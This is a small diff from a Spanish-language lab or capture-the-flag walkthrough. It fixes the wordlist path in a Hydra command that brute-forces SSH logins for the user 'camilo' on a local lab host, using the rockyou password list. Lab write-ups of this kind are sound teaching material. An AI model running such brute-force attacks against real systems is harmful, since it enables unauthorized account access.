@@ -73,5 +73,5 @@ Como no tenemos ningún usuario todavía vamos a ver qué tenemos en la página 
 ```
 Ya tenemos dos posibles usuarios, como parece que somos Camilo vamos a aprovechar el puerto 22 (SSH) para con hydra y fuerza bruta intentar descubrir la contraseña.
 ```bash
-hydra -l camilo -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2
+hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
